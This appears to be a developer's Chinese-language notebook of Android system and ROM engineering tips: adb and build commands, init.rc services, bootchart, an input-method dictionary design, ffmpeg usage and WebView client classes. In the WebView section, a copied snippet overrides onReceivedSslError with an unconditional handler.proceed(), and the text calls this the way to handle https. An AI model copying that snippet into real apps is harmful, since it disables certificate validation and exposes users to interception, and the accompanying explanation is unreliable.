```

## init.rc service说明

```text
+#disabled:服务不会自动运行，必须显式地通过服务器来启动。
+#oneshot:当此服务退出时不会自动重启。
+service hidePhonesky /system/bin/hidePhonesky
+       disabled
+       oneshot    

hidePhonesky只是system/bin下的一个脚本，内容如下
#!/system/bin/sh
#!/system/bin/busybox
mount -o remount,rw /system;
mv /system/priv-app/Phonesky.apk /system/priv-app/Phonesky.bak
```

## [make] make dist

```text
make -j32 dist DIST_DIR=dist_output

产生发布软件包文件（即distribution package）。这个命令将会将可执行文件及相关文件打包成一个tar.gz压缩的文件用来作为发布软件的软件包。
它会在当前目录下生成一个名字类似“PACKAGE-VERSION.tar.gz”的文件。PACKAGE和VERSION,是我们在configure.in中定义的AM_INIT_AUTOMAKE（PACKAGE, VERSION）。
```

## TODO : [知识点] 视频编码H.264,H.265

## TODO : [知识点] 视频格式？MP4,FLV,F4V,TS,AVI,ASF,RMVB,3gp

```text
《Android音视频开发_何俊林_2018-10-23.pdf》
```

## TODO : [知识点] 音频格式

## [知识点] CMOS

```text
CMOS 全名为互补式金属氧化物半导体（Complementary metal–oxide–semiconductor），也就是将 NMOS 和 PMOS 两者做结合，形成 CMOS
```

## [知识点]  SoC

```text
在智慧型手机刚兴起时，在各大财经杂誌上皆可发现 SoC 这个名词，然而 SoC 究竟是什么东西？简单来说，就是将原本不同功能的 IC，整合在一颗芯片中。藉由这个方法，不单可以缩小体积，还可以缩小不同 IC 间的距离，提升芯片的计算速度。至于制作方法，便是在 IC 设计阶段时，将各个不同的 IC 放在一起，再透过先前介绍的设计流程，制作成一张光罩。

然而，SoC 并非只有优点，要设计一颗 SoC 需要相当多的技术配合。IC 芯片各自封装时，各有封装外部保护，且 IC 与 IC 间的距离较远，比较不会发生交互干扰的情形。但是，当将所有 IC 都包装在一起时，就是噩梦的开始。IC 设计厂要从原先的单纯设计 IC，变成了解并整合各个功能的 IC，增加工程师的工作量。此外，也会遇到很多的状况，像是通讯芯片的高频讯号可能会影响其他功能的 IC 等情形。

此外，SoC 还需要获得其他厂商的 IP（intellectual property）授权，才能将别人设计好的元件放到 SoC 中。因为制作 SoC 需要获得整颗 IC 的设计细节，才能做成完整的光罩，这同时也增加了 SoC 的设计成本。或许会有人质疑何不自己设计一颗就好了呢？因为设计各种 IC 需要大量和该 IC 相关的知识，只有像 Apple 这样多金的企业，才有预算能从各知名企业挖角顶尖工程师，以设计一颗全新的 IC，透过合作授权还是比自行研发划算多了。
```

## [知识点]  SIP

```text
系统级封装(systeminpackage，SIP)是指将不同种类的元件，通过不同种技术，混载于同一封装体内，由此构成系统集成封装形式。我们经常混淆2个概念系统封装SIP和系统级芯片SOC。迄今为止,在IC芯片领域,SOC系统级芯片是最高级的芯片;在IC封装领域,SIP系统级封装是最高级的封装。SIP涵盖SOC,SOC简化SIPSOC，与SIP是极为相似的,两者均希望将一个包含逻辑组件、内存组件，甚至包含被动组件的系统，整合在一个单位中。然而就发展的方向来说，两者却是大大的不同：SOC是站在设计的角度出发，目的在于将一个系统所需的组件整合到一块芯片上，而SIP则是由封装的立场出发，将不同功能的芯片整合于一个电子构造体中。
```

## [知识点] Kib Kb KB KIB Byte bit 区别

```text
Ki 和 K 是数学单位
Ki = 1024
K  = 1000
这二者之间没有任何联系

B 和 b 是物理存储单位
B = Byte 即一个字节
b = bit  即一个二进制位
众所周知，Byte和bit的关系是 : 1 Byte = 8 bit

如下结果:
1Kib = 1024 bit
1Kb  = 1000 bit
1KiB = 1024 Byte
1KB  = 1000 Byte
```

## [CMD] RRO

```text
//1. 先看一下资源包有没有安装成功
adb shell cmd overlay list

//2. 启用资源包
adb shell cmd overlay enable overlayAppPackageName

//3. 禁用资源包
adb shell cmd overlay disable overlayAppPackageName

//若有多用户的话需要指定UserID
adb shell pm list users // 查看是否有多用户
adb shell cmd overlay enable --user 0 overlayAppPackageName
```

## TODO : 第三方apk拦截apk的安装？能否使用xposed?

## [性能] Android 启动速度优化工具介绍

```text
在Android 8.0上面，google进行了启动速度的优化，但是对于开发者来说，追求更快的速度是必须的。
这边就介绍一个android启动速度优化的工具，bootchart。
bootchart在5.0的时候就以推出，但是现在的使用方式有了一些调整，下面就简单介绍一下.
 
首先，bootchart在8.0上面已经编译进了boot的image中，需要我们激活使用。
详细步骤如下：
1. 在ubuntu上面，需要安装bootchart:
sudo apt-get install bootchart
2. 连一个userdebug的手机
adb root
adb remount
adb shell touch /data/bootchart/enable
这样就激活了bootchart的应用。
3. 重启一下手机
adb reboot
4. 将bootchart给导出到本地Ubuntu
adb pull /data/bootchart/
5. 使用bootchart的脚本合成分析的启动过程图
system/core/init/grab-bootchart.sh
6. 打开bootchart图即可分析启动的耗时分析。
```

## 默认Wallpaper应用

```text
frameworks/base/core/res/res/values/config.xml
<string name="default_wallpaper_component" translatable="false">com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.picker.TopLevelPickerActivity</string>
这个不能加

01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN: Exception on getWallpaperFile
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN: java.lang.SecurityException: Permission android.permission.READ_EXTERNAL_STORAGE denied for package com.google.android.apps.wallpaper
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.Parcel.createExceptionOrNull(Parcel.java:2373)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.Parcel.createException(Parcel.java:2357)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.Parcel.readException(Parcel.java:2340)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.Parcel.readException(Parcel.java:2282)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.app.IWallpaperManager$Stub$Proxy.getWallpaperWithFeature(IWallpaperManager.java:883)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.app.WallpaperManager.getWallpaperFile(WallpaperManager.java:1078)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.app.WallpaperManager.getWallpaperFile(WallpaperManager.java:967)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at avv.b(PG:7)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at bjw.i(Unknown Source:328)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at azg.doInBackground(PG:160)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.AsyncTask$3.call(AsyncTask.java:394)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at java.util.concurrent.FutureTask.run(FutureTask.java:266)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:305)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at java.lang.Thread.run(Thread.java:923)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN: Caused by: android.os.RemoteException: Remote stack trace:
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.storage.StorageManager.checkPermissionAndAppOp(StorageManager.java:1782)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.storage.StorageManager.checkPermissionAndAppOp(StorageManager.java:1759)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.storage.StorageManager.checkPermissionAndAppOp(StorageManager.java:1826)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.storage.StorageManager.checkExternalStoragePermissionAndAppOp(StorageManager.java:1942)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN:  at android.os.storage.StorageManager.checkPermissionReadImages(StorageManager.java:1908)
01-03 08:05:12.944  8099  8122 E WallpaperMgrCompatVN: 


首次开机无法显示壁纸？
01-03 00:00:15.468   752   752 V WallpaperManagerService: bindWallpaperComponentLocked: componentName=null
01-03 00:00:15.468   752   752 W WallpaperManagerService: Attempted wallpaper ComponentInfo{com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.picker.TopLevelPickerActivity} is unavailable
01-03 00:00:15.473   752   752 W WallpaperManagerService: Failure starting previous wallpaper; clearing
01-03 00:00:15.474   752   752 V WallpaperManagerService: bindWallpaperComponentLocked: componentName=null
01-03 00:00:15.474   752   752 W WallpaperManagerService: Attempted wallpaper ComponentInfo{com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.picker.TopLevelPickerActivity} is unavailable
01-03 00:00:15.475   752   752 E WallpaperManagerService: Default wallpaper component not found!

原因是在 config.xml 中添加了 default_wallpaper_component
```

## [CMD] 列出铃声列表

```text
ls -1 | awk {'print "    $(LOCAL_PATH)/ringtones/"$1":$(TARGET_COPY_OUT_PRODUCT)/media/audio/ringtones/"$1" \\"'};
ls -1 | awk {'print "    $(LOCAL_PATH)/alarms/"$1":$(TARGET_COPY_OUT_PRODUCT)/media/audio/alarms/"$1" \\"'};
ls -1 | awk {'print "    $(LOCAL_PATH)/notifications/"$1":$(TARGET_COPY_OUT_PRODUCT)/media/audio/notifications/"$1" \\"'};
```

## [输入法] SageRealIME2.0----按键联想输入法的开发

```text
词库
来源1.通过爬虫爬取 opensubtitles(https://www.opensubtitles.org/en/search/subs)网站的字幕文件
来源2.LatinIME的自带dicts
来源3.各国的电子书和网站
...

写了一个分词程序对获取到的资料进行分析，主要就是对单词进行一个统计，然后按照频率排序，并插入到SQLITE数据库中，流程图如下：

对文件根据空格分词
判断列表中是否有这个单词
有：频率+1  没有：添加单词，频率+1
循环完了之后对列表按照频率进行排序

最终得到的数据如下:
you 28787591
i 27086011
the 22761659
to 17099834
a 14484562
it 13631703
and 10572938
that 10203742
of 8915110
is 7400675
in 7337058
what 6900164
we 6755687
me 6444985
this 5739788
he 5516364
for 5174060
my 4938948
....

为了适配按键丝印功能，需要对词库进行进一步的处理
以you为例

最终会把you转换生成一个数字
y -> 9
o -> 6
u -> 8

转换后的数据如下：
you 968
the 843
to 86
it 48
and 263
that 2428
of 63
is 41
in 46
what 9482
we 93
me 63
this 2482
he 43
for 367
my 69
....

再把这些数据按顺序插入到数据库中，用这个数据我们就可以来实现联想功能了
以 what 为例，首先我们需要打一个 w 这个在丝印上对应的按键是 9，这个时候还不会去查找数据库，只是会先打开数据库做后续准备，界面上显示会是 W X Y Z w x y z 9 这样的按键丝印。
然后再打一个 h(4)，这个时候就会去数据库中查找 94 开头的单词列表(select * from en where keycode like "94%";)，如下：
what|9428
within|948446
what's|94287
without|9484688
wife|9433
win|946
white|94483
whose|94673
whom|9466
winning|9466464
wide|9433
whole|94653
whether|9438437
widely|943359
wing|9464
William|9455426
winter|946837
White|94483
winner|946637
....

输入的数字越多，结果也就越精确，从目前的测试结果来看按 3-5 次按键基本上就能得到想输入的单词。

由于每个数据库的数据量都非常大，以英语的数据库 en_US.db 为例，数据量非常大有 160715 条单词记录，这个数据库文件有6.6M，每一次查询需要200ms左右的时间，这是对ROM比较小的 MyOS 来说是相当不友好的，而且对查询速度也有一定影响，所以我又做了以下几点的优化。
1.删减数据库
把一些不常用的单词给删掉，比如删掉频率小于1000的单词，这样可以删掉8W多的单词，省出3M左右的空间，查询时间也可以减少一半左右，也就是100ms左右。
2.拆分数据库
把2,3,4,5,6,7,8,9开头的单词拆分出来分别建表，这样做可以不用每次都去一整个数据库中去查找而只要到对应的按键的表中去查找就可以了，因为在第一次按下某个键的时候就已经可以确定了。这个优化对空间的影响不大，对查找速度却有非常大的好处，可以缩短为原来的八分之一左右，也就是12ms左右。
3.优化数据库
拆分完了数据库之后，每张表keycode字段都是以同一个数字开头的，以 key9 这个表为例，里面的没一个 keycode 都是以 9 开头的，这就产生了一定的冗余，完全可以把所有记录中的第一个字符删除，用于节省空间，8W条记录，每条记录节省1个字符(2Byte)的空间就是 80000 x 2 = 160000(Byte) 约等于 160KB 左右。

目前支持的语言有
bg_BG
cs_CZ
da_DK
de_DE
el_GR
en_GB
en_US
es_ES
fi_FI
fr_FR
hr_HR
hu_HU
it_IT
lt_LT
lv_LV
nb_NO
nl_NL
pl_PL
pt_BR
pt_PT
ro_RO
ru_RU
sk_SK
sl_SI
sq_AL
sr_RS
sv_SE
tr_TR
zh_CN(先转换成拼音，再转换成keycode)
理论上可以支持所有的语言，只是有一些词库不太容易获取，还有一些语言（如阿拉伯语等）的拼写规则不了解。

其他：
1.emoji表情列表的开发，把表情整合到输入的过程中
2.输入单词之后自动添加空格
3.状态栏图标自动生成工具
4.长按删除
5.按键输入框
6.back键删除
7.单词大小写的快捷转换
8.精简apk包
9.数据库宏控
10.首字母大写功能
11.研究注音输入法
private static String num_1 = "ㄅㄆㄇㄈ";
private static String num_2 = "ㄉㄊㄋㄌ";
private static String num_3 = "ㄍㄎㄏ";
private static String num_4 = "ㄐㄑㄒ";
private static String num_5 = "ㄓㄔㄕㄖ";
private static String num_6 = "ㄗㄘㄙ";
private static String num_7 = "ㄚㄛㄜㄝ";
private static String num_8 = "ㄞㄠㄡㄟ";
private static String num_9 = "ㄢㄣㄤㄥㄦ";
private static String num_0 = "ㄧㄨㄩ";

收益：
目前已经有很多项目采用了这个输入法，省去了买第三方输入法的费用，保留一定的议价空间，提升产品的竞争力。
2923_Aspera

其他一些待改进的思路和方向：
1.开发树状结构文件格式来保存词库
2.把数据库里面的数据做进一步的压缩

参考文献：
//中州输入法
https://rime.im/code/

//印度输入法
https://gitlab.com/indicproject/indic-keyboard/tree/master
git clone --recursive git@gitlab.com:smc/Indic-Keyboard.git

如何在一周内做一款拼音输入法
https://www.jianshu.com/p/ea70b424030e

https://github.com/ManiacDC/TypingAid/tree/master/Wordlists

//印尼语
https://github.com/geovedi/indonesian-wordlist

//缅甸语
https://github.com/kanaung/wordlists

//维吾尔语输入法
https://gitee.com/ali_iii/UyKeyboard

//东噶藏语输入法
https://gitee.com/anstudio/iFlytekTibetanIME

//QQ五笔新世纪词库.txt + 新世纪五笔2级简码表.xlsx
https://gitee.com/Ufmbhc/InputMethod

//单手笔顺输入法码表 stroke-seq_MB
https://www.oschina.net/p/stroke-seq_mb

//注音输入法
https://gitee.com/kumei/xgimi_zhuyin_input

//A拼音: 开源的 Android 拼音输入法
https://gitee.com/sceext2133/a_pinyin

//Pinyin2Hanzi
https://gitee.com/iownu/Pinyin2Hanzi

//用注释版谷歌拼音改造为哈萨克斯坦语输入法
https://gitee.com/guocdfeifei/PinyinIme_to_hasakst

//哈萨克斯坦语输入法
https://gitee.com/guocdfeifei/Android_ha_ime

//一个 emacs 中文输入法，支持全拼，双拼，五笔和仓颉，在线文档： http://tumashu.github.io/pyim    https://github.com/tumashu/pyim
https://gitee.com/dama-emacs/pyim

//阿拉伯语智能输入法，windows平台
https://gitee.com/gamoos/GaInput

https://www.wordfrequency.info/5k_lemmas_download.asp

//匈牙利语
https://en.wiktionary.org/wiki/Wiktionary:Frequency_lists/Hungarian_wordlist

https://github.com/hermitdave/FrequencyWords/

https://en.wiktionary.org/wiki/Wiktionary:Frequency_lists/Hungarian_wordlist

//日语常用 15000
http://www.manythings.org/japanese/words/leeds/

//注音简介
http://chukaml.tripod.com/linguistics/unicode/codeChart/U003100.html

//注音输入法
https://en.wikipedia.org/wiki/Bopomofo

https://r12a.github.io/scripts/bopomofo/ontheweb
//注音，繁体，笔顺，异体字，可以通过爬虫的方式获取
https://www.zdic.net/hans/%E5%9C%8B

<ruby><rbc><rb>国</rb></rbc><rtc><rt>ㄍㄨㄛˊ</rt></rtc><rtc><rt>guó <span class="ptr"><a class="audio_play_button i_volume-up ptr" data-src-mp3="//img.zdic.net/audio/gycd/zd/2395.ogg"></a></span> </rt></rtc></ruby>

//汉字大全
http://www.aies.cn/b.htm

//萌典
https://github.com/racklin/moedict-desktop
https://www.moedict.tw/~%E5%A4%A9
<rb>天</rb><zhuyin><yin>ㄊㄧㄢ</yin><diao></diao></zhuyin></ru>
```

## [知识点] EVT、DVT、DMT、MVT、PVT、MP

```text
EVT(Engineering Verification Test)工程验证测试阶段
产品开发初期的设计验证。许多产品刚设计出来仅为工程样本，问题很多需要把可能出现的设计问题一一修正，重点在考虑设计完整度，是否有遗漏任何规格。包括功能和安规测试，一般由RD对样品进行全面验证，因是样品，问题可能较多，测试可能会做N次。

DVT(Design Verification Test)设计验证测试阶段
此为研发的第2阶段，所有设计已全部完成，重点是找出设计问题，确保所有的设计都符合规格。由RD和DQA(Design Quality Assurance)验证。此时产品基本定型。

DMT(Design Maturity Test)成熟度验证
可与DVT同时进行，主要极限条件下测试产品的MTBF (Mean Time Between Failure)，HALT(High Accelerated Life Test）& HASS(High Accelerated Stress Screen)等，是检验产品潜在缺陷的有效方法。

MVT(Mass-Production Verification Test)量产验证测试
验证量产时产品的大批量一致性，由DQA验证。

PVT(Production/Process Verification Test)生产/制程验证测试阶段
此阶段产品设计要全数完成，所有设计验证亦要结束，最后只是要做量产前的验证，确定工厂有办法依照标准作业流程做出当初设计的产品。

MP(Mass Production)量产
当经过以上所有测试阶段，工厂便可将该设计进行大量生产，理论上要进入量产阶段，所有设计及生产问应该没有任何遗漏及错误，成为正式面市产品。
```

## 展锐 win 上下载工具加载 pac 会很慢是因为加载时会校验，修改以下配置跳过校验，可以瞬间加载完成

```text
C:\Users\35648\Desktop\(研发下载)ResearchDownload_R24.0.0003\ResearchDownload_R24.0.0003\Bin\BinPack.ini

[Setting] 

;MaxDataLength,unit is M,when MaxDataLength is zero,the loadpolicy is invalid.
MaxDataLength = 50

;LoadPolicy
;if 0, CRC check and generate the temporary download image
;if 1, CRC check and don't generate the temporary download image  ( Recommended )
;if 2, don't check crc and don't generate the temporary download image
LoadPolicy = 2
```

## 壁纸设置为仅锁屏界面显示和锁屏界面&待机界面同时显示，图片比例显示不一致

```text
http://192.168.3.78:7080/c/SPRD_R/MOCORDROIDR_Trunk_W20.36.4/+/46208
```

## [知识点] Deep idle

```text
Deep idle是一种CPU进入空闲后的状态，也就是在idle进程执行的。简单地说，MTK会在CPU进入空闲的情况下，再去关闭一些不必要的power domain，以达到最省电的目的。
通俗的理解就是CPU的空闲状态，即 CPU0 单核运行，其他CPUX不运行，即处于关核状态
```

## [工具] perfdog

```text
最近公司在做直播课堂的项目，需要测试移动的性能，介于公司人手不多，没时间取自研一个移动端的性能工具，市面上开源的也比较少，以前用过的只有GT，也是腾讯开发的一款性能测试工具，不过测试某些指标还需要下载插件，然后发现了一款较为好用的工具，即perfdog

下载地址：https://perfdog.qq.com/
使用说明：https://bbs.perfdog.qq.com/article-detail.html?id=5

特别说明事项：
windows连接ios，请先下载itunes，然后插数据线连接iphone，然后可以打开perfdog，即可连接
windows连接安卓，参考文档即可

1.选择你要观察的数据，点击开始即可记录（及时没勾选它也会把全部性能指标记录下来，只是测试过程中无法看到）
2.点击停止后可以选择保存到本地，或者直接保存到云服务上，登录账号即可查找到
```

## [CMD] sed -i 删除特定行

```text
找出所有包含 HD 1080p 字符串的 strings.xml 文件，并删除该行
find . -name "strings.xml" | xargs sed -i '/HD 1080p/d'
```

## gerrit

```text
过滤所有我review的提交
label:Code-Review=+2,zhangqi -owner:self -status:abandoned

# 时间段查询命令
查询 2019-09-10 00:00:00  ~ 2019-09-12 00:00:00 之间的提交，查询命令： after:2019-09-10  before:2019-09-12

# 查询 张三 在2019 全年的提交记录 (包含所有状态)
ssh -p 29418 gerrit服务器 gerrit query --format=JSON after:2019-01-01 before:2019-12-30 owner:zhangsan | tee log

# 查询 张三 在2019 全年的提交记录 (仅 merged 状态)
ssh -p 29418 gerrit服务器 gerrit query --format=JSON after:2019-01-01 before:2019-12-30 status:merged owner:zhangsan |tee log

# 查询 张三 在2019 全年的提交记录 (仅  aabbcc 分支 和  merged 状态)
ssh -p 29418 gerrit服务器 gerrit query --format=JSON after:2019-01-01 before:2019-12-30  branch:aabbcc  status:merged owner:zhangsan |tee log
```

## ffmpeg

```text
1. 转封装
例1：把mp4的音频转封装为ts的音频
ffmpeg -i mp4-onDemand-aaclc_low.mp4 -codec:a copy 22.ts
详解：-i表示输入，输入文件的格式没有特别的选项来控制，是直接通过文件名的后缀来体现的
-codec:a copy表示不重新编码音频，同理-codec:v copy表示不重新编码视频
22.ts表示输出，它与输入不同，输入有-i来表示这是输入，输出没有类似的选项，直接用文件名即可。输出文件的格式也是用文件名的后缀来体现。
例2：把mp4的视频转封装为ts的视频
ffmpeg -i b.mp4 -codec copy -bsf h264_mp4toannexb a.ts
详解：-bsf h264_mp4toannexb是MP4转TS的标配，原因ffmpeg提示说是H264的头部有问题
例3：把独立的两个音视频合并从成一个mp4媒体文件
ffmpeg -i mp4-onDemand-h264bl_full.mp4 -i mp4-onDemand-aaclc_high.mp4 -codec:v copy -codec:a copy 55.mp4
详解：用两个-i来表示输入即可
例4：在一个视频文件（含音频与视频）中提取音频
ffmpeg.exe -i d:/temp/linux操作系统基础.wmv -vn d:/temp/33.wav
详解：-vn的意思是“video no”，同理-an可以提取视频

2. 转码
例1：TS文件转换码率，指定B帧
ffmpeg -i 1e.ts -f mpegts -threads 16 -bufsize 2000k -acodec mp2 -ab 128k -vcodec libx264 -x264opts keyint=12:min-keyint=12:bframes=3:b-adapt=0:open-gop=0:slices=1:bitrate=1800:vbv-bufsize=1800:nal-hrd=cbr:fps=29.97:b-pyramid=none:scenecut=0 4e.ts

3. 把图片转换为视频
例1：ffmpeg -f image2 -r 1 -i test%1d.jpg -r 1 -s 600x300 test.avi

4. 从一段长视频中截取一段视频
例1：ffmpeg -ss 00:46:28 -i "Morning_News.asf" -acodec copy -vcodec copy -t 00:03:25 output.asf

5. 把两段视频合并
例1：ffmpeg -i concat:"part1.avi|part2.avi" -vcodec copy -acodec copy output.avi
注：part1与part2格式必须完全一致，而且part1必须要有声音
```

## [CMD] 设置电池低电量测试环境

```text
adb shell dumpsys battery set level 1---设置手机电量为1％;
adb shell dumpsys battery unplug---设置断开充电
adb shell dumpsys battery reset---复位，恢复实际状态
```

## [CMD] 如何adb shell查看ram和rom 大小

```text
查看 emmc size（ROM（flash））
sp9850ka_1h10:/ # cat /sys/block/mmcblk0/size
cat /sys/block/mmcblk0/size 30535680 // 这是block数，乘512 就是字节大小，
sp9850ka_1h10:/ # 查看 ddr物理 size（ram （内存））
sp9850ka_1h10:/ # cat /proc/sprd_dmc/property
cat /proc/sprd_dmc/property 2048 // 这就是内存是2048MB的内存
```

## APK Inspector??

```text
APKinspector是一款强大的工具，可以帮助分析人员手动分析Android恶意软件样本，GUI部分使用了PyQT。
APKinspector的主要特点如下:
(1) Graph-based UI displaying control flow of the code.
(2) Links from graph view to source view.
(3) Function/Obj
```

## Android 中 WebViewClient 与 WebChromClient 两个类的区别

```text
https://blog.csdn.net/lanxingfeifei/article/details/52045082

WebViewClient类与WebChromClient两个类在android开发的过程中，主要是在使用WebView这个组件的时候，可能会使用到。那么这两个类到底有什么不同之处呢？

WebViewClient 这个类主要帮助WebView处理各种通知、请求时间的，比如：
onLoadResource
onPageStart
onPageFinish
onReceiveError
onReceivedHttpAuthRequest

WebChromeClient主要辅助WebView处理JavaScript的对话框、网站图片、网站title、加载进度等比如
onCloseWindow(关闭WebView)
onCreateWindow()
onJsAlert(WebView上alert无效，需要定制WebChromeClient处理弹出)
onJsConfirm
onProgressChanged
onReceivedIcon
onReceivedTitle

看上去他们有很多的不同，实际使用的话，如果你的WebView只是用来处理一些html的页面呃逆荣，只用WebViewClient就行了，如果需要更丰富的处理效果，比如JS、进度条等，就要用到WebChromeClient。

通常情况下在使用WebView的时候，需要使用一下的语句：

WebView webView = (WebView) findViewById(R.id.webview);
webView.setWebChromeClient(new WebChromeClient());
webView.setWebViewClient(new WebViewClient());
webView.getSettings().setJavaScriptEnabled(true);
webView.loadUrl(url);

这样你的WebView理论上就能有大部分选哟实现的特色了，当然，有些更精彩的内容还是需要自己添加的。

WebViewClient的方法的详细说明：

public boolean shouldOverrideUrlLoading(WebView view,String url){
    return true;
}
//在点击请求的是连接是才会调用，重写此方法返回true表明点击网页里面的链接还是在当前的webView里跳转，不跳到浏览器里边

2.onReceivedSslError()
public void onReceivedSslError(WebView view,SslErrorHandler handler,android.net.http.SslError error){
    handler.proceed();
}
//重写此方法可以让webView处理https请求

3. shouldOverrideKeyEvent()
public boolean shouldOverrideKeyEvent(WebView view,KeyEvent event){
    return super.shouldOverrideKeyEvent(view,event);
}
//重写此方法才能够处理在浏览器中的按键事件

4. onLoadResource();
public void onLoadResource(WebView view, String url){
    if(DEBUG){
        Log.d(TAG , "onLoadResource");
    }
    super.onLoadResource(view, url);
}
// 在加载页面资源是会调用，每一个资源（比如图片）的加载都会调用一次
5. onPageStarted()';


public void onPageStarted(WebView view, String url, Bitmap favicon){
    if(DEBUG){
        Log.d(TAG,"onPageStarted");
    }
    if(url.endsWith(".apk")){
        download(url);  //下载处理
    }
    super.onPageStarted(view, url, favicon);
}
//在页面开始加载时调用

6. onPageFinished()

public void onPageFinished(WebView view,String url){
    if(DEBUG){
        Log.i(TAG,"onPageFinished");
    }
    super.onPageFinished(view, url);
}
在页面加载结束的时候调用
```

## [知识点] eng/user/ud

```text
android编译的时候可以选择编译选项 eng、user 和 userdebug。

1.eng编译选项
(1). 系统编译的时候安装标签LOCAL_MODULE_TAGS为 user、debug、eng 的模块
(2). 设定属性 ro.secure=0，关闭安全检查功能
(3). 设定属性 ro.debuggable=1，启用应用调试功能
(4). 默认打开 adb 功能，adb拥有root权限

2.userdebug编译选项
(1). 系统编译的时候安装标签LOCAL_MODULE_TAGS为 user、debug 的模块
(2). 设定属性 ro.secure=1，打开安全检查功能
(3). 设定属性 ro.debuggable=1，启用应用调试功能
(4). 默认打开 adb 功能，adb拥有root权限
(5). userdebug与“user”类似,但具有 root 权限和调试功能；是进行调试时的首选编译类型

3.user编译选项
(1). 系统编译的时候安装标签LOCAL_MODULE_TAGS为 user的模块
(2). 设定属性 ro.secure=1，打开安全检查功能
(3). 设定属性 ro.debuggable=0，关闭应用调试功能
(4). 默认关闭 adb 功能，adb无root权限
(5). 权限受限,适用于生产环境

综上总结:
eng就是工程师用的开发测试环境，方便开发调试各种软硬件之间的交互、性能等等。
userdebug就是user版本发布之前的开发调试版本
user就是生产环境用的版本，平时我们正规渠道买的手机都是user版本的。
目前很多App检测运行环境是否正常的检测点之一就是检测当前运行的系统属于哪个编译选项。eng、userdebug都是属于风险设备考虑范畴。
```

## [CMD] 危险权限列表查看

```text
adb shell pm list permissions -g -d
```

## [CMD] GPU

```text
//GPU freq
如查看GPU档位：adb shell "cat /proc/gpufreq/gpufreq_opp_dump"
定GPU 档位：adb shell "echo 728000 > /proc/gpufreq/gpufreq_opp_freq"
查看是否设置成功：adb shell "cat /proc/gpufreq/gpufreq_var_dump"
//循环看FPS是多少
adb shell "while(true) ; do cat /d/ged/hal/ged_kpi; sleep 1; done" >> 11.log // Whitney以后才有
adb shell "while(true) ; do cat /proc/gpufreq/gpufreq_var_dump | grep g_cur_opp_freq; sleep 1; done"
//循环看GPU loading(使用过,没有生效)
IMG GPU：adb shell "while(true) ; do cat /d/ged/hal/gpu_utilization；sleep 0.1; done" >> 11.log
Mali GPU：adb shell "while(true);do cat /proc/mali/utilization;cat /proc/gpufreq/gpufreq_var_dump;sleep 0.1; done"
(该命令可以生效)adb shell "date; cat /proc/gpufreq/gpufreq_opp_dump; while(true) ; do cat d/ged/hal/gpu_utilization; cat /proc/gpufreq/gpufreq_var_dump | grep g_cur_gpu_freq; sleep 1 ; done | tee /sdcard/gpuinfo.txt"
```

## [CMD] 批量安装

```text
find ./ -name "*.apk" -exec adb install -g {} \;
```

## [CMD] dropbox

```text
adb shell dumpsys dropbox -p > dropbox.log
```

## ODEX

```text
adb shell cmd package compile -m speed -f com.android.chrome
[speed odex] (https://blog.csdn.net/fan380485838/article/details/81908591)
```

## 设置置顶的activity

```text
adb shell dumpsys activity top | grep "ACTIVITY"
```

## UX odex 方式

```text
adb shell dumpsys package com.android.chrome
```

## speed app

```text
https://source.android.com/devices/tech/debug/systrace
http://blog.udinic.com/2015/09/15/speed-up-your-app
```

## 查找文件(排序)

```text
find -name "*.vdex" -exec ls -lh {} \;
ls -lSh $(find -name "*.vdex")
```

## swappiness

```text
(swappiness 详解)[https://askubuntu.com/questions/103915/how-do-i-configure-swappiness] 
cat /proc/sys/vm/swappiness  (范围 0-100)
free -m (total) / 100 = A 

A * 10 (这里的10 是swappiness的值)

root@onezero:/home/one# free -m
             total       used       free     shared    buffers     cached
Mem:          3950       2262       1687          0        407        952
-/+ buffers/cache:        903       3047
Swap:         1953          0       1953

3950 / 100 = 39.5 * 10 = 395 当内存剩余时,使用swap
```

## [CMD] git fetch -p

```text
删除了一些多余分支，push之前先 git fetch -p 一下
```

## [知识点] 软件开发三重门

```text
我在“软件开发‘三重门’”里说过，
第一重门是业务功能，在这重门里，的确是会编程就可以了；
第二重门是业务性能，在这一重门里，技术的基础就很管用了，比如：操作系统的文件管理，进程调度，内存管理，网络的七层模型，TCP/UDP的协议，语言用法、编译和类库的实现，数据结构，算法等等就非常关键了；
第三重门是业务智能，在这一重门里，你会发现很多东西都很学院派了，比如，搜索算法，推荐算法，预测，统计，机器学习，图像识别，分布式架构和算法等等，你需要读很多计算机学院派的论文。
```

## [深度解析] development/samples/FixedGridLayout 研究

```text
package com.example.android.fixedgridlayout;

import android.content.Context;
import android.content.res.TypedArray;
import android.util.AttributeSet;
import android.util.SparseIntArray;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
